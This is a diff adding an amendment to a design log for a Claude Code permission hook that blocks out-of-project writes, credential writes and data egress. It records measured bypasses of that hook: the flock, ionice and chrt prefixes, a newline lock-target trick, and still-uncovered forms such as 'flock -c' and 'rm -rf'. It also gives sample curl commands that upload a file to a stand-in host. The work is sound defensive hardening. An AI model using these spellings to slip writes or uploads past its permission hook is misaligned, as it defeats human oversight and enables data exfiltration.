@@ -1003,3 +1003,193 @@ on a `git worktree add` sharing the heredoc opener's line.
 NOT MEASURED, stated plainly: a write LANDING ON DISK through the full Claude Code path,
 which a `PreToolUse` hook test cannot show at all, the same boundary every earlier cycle in
 this family recorded.
+
+## Amendment (cycle S): three more wrapper prefixes, and a positional that must NOT be shape-checked
+
+Same seam, sixth instance, same single function, and this time no new mechanism at all.
+`verb_at` still steps over a command prefix only by membership in `WRAPPERS`, so `flock`,
+`ionice` and `chrt` became `cmd0` themselves and the real command was never resolved.
+`verb_at` is the single source for the write pass, the egress pass and the interpreter
+pass, so each of the three hid a write AND a data transfer.
+
+### Measured before the fix
+
+At the OUTER hook layer first, because that is where the defect was observed: a crafted
+`PreToolUse` envelope for the real hook, run from a cwd outside the project so the write
+target lands out of bounds, with `nice` (already a `WRAPPERS` member) as the
+registered-wrapper positive control.
+
+```
+cp README.md ~/outside_probe.txt                     -> DENY  [ENF-PROJECT-BOUNDARY]
+nice cp README.md ~/outside_probe.txt                -> DENY  [ENF-PROJECT-BOUNDARY]
+flock /tmp/l.lock cp README.md ~/outside_probe.txt   -> ALLOW (silent, no decision)
+ionice -c3 cp README.md ~/outside_probe.txt          -> ALLOW (silent, no decision)
+chrt -b 0 cp README.md ~/outside_probe.txt           -> ALLOW (silent, no decision)
+```
+
+Then through the gate's own embedded extractor with `WRIT_CWD=/proj`. Cycle P's plan
+claimed an egress before-state it had only measured on the write half; this cycle measured
+BOTH halves before the entries landed, which is the whole point of the row block below:
+
+```
+cp seed.txt src/y.py                                          -> local /proj/src/y.py  (control)
+nice -n 5 cp seed.txt src/y.py                                -> local /proj/src/y.py  (control)
+flock /tmp/l.lock cp seed.txt src/y.py                        -> set()
+ionice -c3 cp seed.txt src/y.py                               -> set()
+chrt -b 0 cp seed.txt src/y.py                                -> set()
+
+curl -d @src/a.txt https://example.invalid                    -> egress example.invalid  (control)
+nice -n 5 curl -d @src/a.txt https://example.invalid          -> egress example.invalid  (control)
+flock /tmp/l.lock curl -d @src/a.txt https://example.invalid  -> set()
+ionice -c3 curl -d @src/a.txt https://example.invalid         -> set()
+chrt -b 0 curl -d @src/a.txt https://example.invalid          -> set()
+```
+
+The bash-side hot-path early exit was CHECKED rather than assumed: its first arm matches
+`*"cp "*`, so all three probes reached the python extractor exactly as the `nice` control
+did. The single mechanism is `verb_at`.
+
+### Decision: three more STRICT tables, read off `--help` and not off the completion files
+
+Cycle P's posture is reused unchanged. Each entry carries both a value-flag set and a
+no-value-flag set; `PERMISSIVE` (a `None` second element) is rejected for the same reason
+as before, since it reads a SPACED value of an unknown flag as the verb, and it matters
+more here because two of the three also step a positional.
+
+The tables were drafted from `/usr/share/bash-completion/completions/*` and then CORRECTED
+against the installed binaries' own `--help` (util-linux 2.39.3 for all three). That found
+one real divergence and one gap, which is why the operational step is not optional:
+
+- The completion file reads ionice's `-p`, `-P` and `-u` as bare switches. `ionice --help`
+  spells them `-p, --pid <pid>...`, `-P, --pgid <pgrp>...` and `-u, --uid <uid>...`, each
+  taking a following value, so all three are VALUE flags here rather than NOVALUE. Nothing
+  pinned flips either way, because those forms run no command at all, but the table is now
+  what the binary says rather than what a completion script implied.
+- chrt's `-a/--all-tasks`, `-m/--max` and `-v/--verbose` ARE named by 2.39.3's `--help`,
+  so they are listed. An unclassified flag bails and re-blinds that spelling, so a missing
+  name is a hole, not a tidy omission. chrt's `-p/--pid` really is value-less there (the
+  pid follows as a positional, `chrt [options] -p <pid>`), which is the opposite of
+  ionice's `-p`.
+- flock 2.39.3 prints no `--nb` or `--wait` aliases, so neither is listed.
+
+A LETTER MEANS DIFFERENT THINGS IN DIFFERENT TABLES, and the three must never be
+copy-pasted between one another: flock's `-n` is `--nonblock` (no value) while ionice's
+`-n` is `--classdata` (value), and chrt's `-P` is `--sched-period` while ionice's `-P` is
+`--pgid`.
+
+### The positional shape becomes per wrapper, which is the only mechanism change
+
+`WRAPPER_POSITIONALS` existed, but the loop that consumed it hardcoded timeout's shape:
+
+```python
+for _ in range(WRAPPER_POSITIONALS.get(name, 0)):
+    if i < len(seg) and DURATION.match(dequote(seg[i])):
+```
+
+`DURATION` is `^[0-9]+(\.[0-9]+)?[smhd]?$`, which no lock path matches. A bare
+`"flock": 1` entry would therefore have left the prefix BLIND: the path would not be
+skipped, `basename("/tmp/l.lock")` would resolve as the verb, and the entry would have
+read as a fix while changing nothing. The fix is a second side table keyed the same way:
+
+```python
+WRAPPER_POSITIONALS = {"timeout": 1, "flock": 1, "chrt": 1}
+DURATION = re.compile(r"^[0-9]+(?:\.[0-9]+)?[smhd]?$")     # timeout: coreutils duration
+PRIORITY = re.compile(r"^[0-9]+$")                         # chrt: non-negative integer
+LOCK_TARGET = re.compile(r"[\s\S]")                        # flock: any non-empty token
+WRAPPER_POSITIONAL_SHAPES = {"timeout": DURATION, "flock": LOCK_TARGET, "chrt": PRIORITY}
+```
+
+with the loop's condition becoming `WRAPPER_POSITIONAL_SHAPES[name].match(...)`. The
+`WRAPPER_POSITIONALS.get(name, 0)` expression is preserved byte for byte, because an
+existing mutation test targets that exact string.
+
+`LOCK_TARGET` IS `[\s\S]` AND NOT `.`, and the difference is a live bypass rather than a
+matter of taste. This cycle's first implementation used `.`, which in python does not match
+a newline without `re.DOTALL`. A lock target that dequotes to a bare newline was therefore
+NOT stepped, the newline resolved as the verb, and the segment went silent on the write,
+credential and egress passes at once. Real flock accepts it: a lock file named with a
+newline is created and the wrapped command runs. Measured against the hook, `flock $'\n' cp
+x <outside>` was ALLOWED while both an ordinary lock path and the bare command were DENIED.
+An empty token still does not match, which is the correct direction: flock exits 66 on an
+empty lock name, so nothing runs. Review caught this before it shipped; the pin is
+`TestFlockPositional::test_a_newline_only_lock_target_is_stepped_like_any_other`.
+
+WHAT QUALIFIES a wrapper for the positional table is that its positional is MANDATORY, not
+that it has a checkable shape. That distinction is new this cycle and it is what carries
+`flock`: cycle P's justification (a duration has a checkable shape) covers `timeout` and
+`chrt` only. `coproc` and `function` stay excluded for the opposite reason, since their
+NAME is OPTIONAL and stepping it is a guess.
+
+The two fail directions are deliberately OPPOSITE, and each is right for its tool:
+
+- `flock` is stepped UNCONDITIONALLY. A shape check there would BE the defect rather than
+  the guard, because a lock file can be named anything. One skip is correct in both
+  spellings: with a command present, flock reads the first positional as a FILE even when
+  it looks numeric, so `flock -x 200 cp seed.txt src/y.py` really does run `cp`. The fd
+  form `flock -x 200` and the bare `flock` both land past the end under the `i < len(seg)`
+  guard and yield no verb, which is right because neither runs a command.
+- `chrt` stays SHAPE-CHECKED against `PRIORITY`. A priority-less `chrt -b cp seed.txt
+  src/y.py` is a command chrt itself rejects ("invalid priority argument"), and the check
+  is what keeps `cp` visible instead of swallowing it as a bogus priority. Cost at worst
+  is an extra row for a command that never runs, never a lost row for one that does.
+- `ionice` gets NO positional entry, so the token after its options IS the verb.
+
+The lookup is a bare SUBSCRIPT rather than `.get` with a default. A positional entry with
+no shape entry is a table drift, and a loud failure beats a silently-chosen default; a
+key-set parity test over both tables, parsed from the extractor source by `ast`, makes that
+drift red at test time instead.
+
+Alternatives rejected:
+
+- Widen the `WRAPPERS` tuple to three elements. It touches thirteen entries that have no
+  positional, to carry a field that is `None` in all of them.
+- One regex for all three. Any single shape re-blinds whichever wrapper it does not fit,
+  which is exactly the defect being fixed.
+- Skip unconditionally for all three. It costs chrt's priority-less form, where the token
+  that would be swallowed is the real command.
+
+### Accepted misses, each pinned as a silence rather than left to be rediscovered
+
+- `flock /tmp/l.lock -c 'cp seed.txt src/y.py'`. The lock target is stepped, `-c` then sits
+  in verb position, `basename("-c")` is not a `WRAPPERS` key, and the body is ONE quoted
+  token. The same deliberately-uncovered class as `bash -c` and `watch -n1 '...'`, ruled
+  out by the false-positive cost of gating every such command, not by a parsing obstacle.
+- `flock cp seed.txt src/y.py` resolves `seed.txt`, which matches no arm. That is not a
+  miss: with no command after it, flock really would treat `cp` as the lock file, so the
+  skip agrees with the tool's own grammar rather than guessing against it.
+- The id forms that run no command: `ionice -p 1234`, `chrt -p 1234` and `chrt -p 5 1234`
+  are all silent, and none can name a wrong verb, because trailing digits never coincide
+  with a write arm.
+- DELETION stays out of scope for this gate by recorded ruling, so
+  `flock /tmp/l.lock rm -rf src` STAYS silent after the fix.
+- The worktree gate's own seven-name `WRAPPERS` is NOT grown, for the reason cycle P
+  recorded: its parsing is permissive-only by design, it has no positional mechanism, and
+  the evasion there is INFERRED from the code rather than measured. Only its comment moves,
+  so the stated divergence (thirteen, now sixteen, against seven) does not go stale.
+
+### The residue block, and one honest downgrade
+
+The header's names-only `# UNCOVERED PREFIXES BEGIN/END` block loses `flock`, `ionice` and
+`chrt`, which the existing disjointness ratchet in `tests/test_bash_egress_gate.py` enforces
+on its own: leaving a name there while it is a `WRAPPERS` key goes red. `parallel`,
+`unbuffer` and `fd` move from "no table here yet" to NOT INSTALLED on this machine, so
+their gaps are UNMEASURABLE here rather than merely unmeasured, and none is added on
+inference. `script`, `su -c` and `strace` are installed and stay out of scope this cycle.
+
+### Measured versus inferred
+
+MEASURED: the six outer-hook decisions before the fix and the same six after it (the three
+new prefixes flip from a silent allow to the same `[ENF-PROJECT-BOUNDARY]` deny the two
+controls already returned, and `flock -c` stays silent); the ten extractor rows above
+before the fix and after it, both halves; each of the three flag tables against the
+installed binary's own `--help` (util-linux 2.39.3), including the ionice correction that
+contradicted the drafted table; and the full hook's `permissionDecision` for the prefixed
+credential write (deny, `SEC-CREDENTIAL-WRITE`) and the prefixed egress command (`ask`,
+naming the host) for all three prefixes, which needs no daemon.
+
+NOT MEASURED, stated plainly: a write LANDING ON DISK through the full Claude Code path,
+which a `PreToolUse` hook test cannot show at all, the same boundary every earlier cycle in
+this family recorded; and the real hook's `permissionDecision` for a prefixed IN-PROJECT
+write, which needs the session daemon and is proved at the extractor layer only. INFERRED,
+not measured, and unchanged from cycle P: `timeout 5 git worktree remove x` evading the
+worktree gate by the same mechanism.
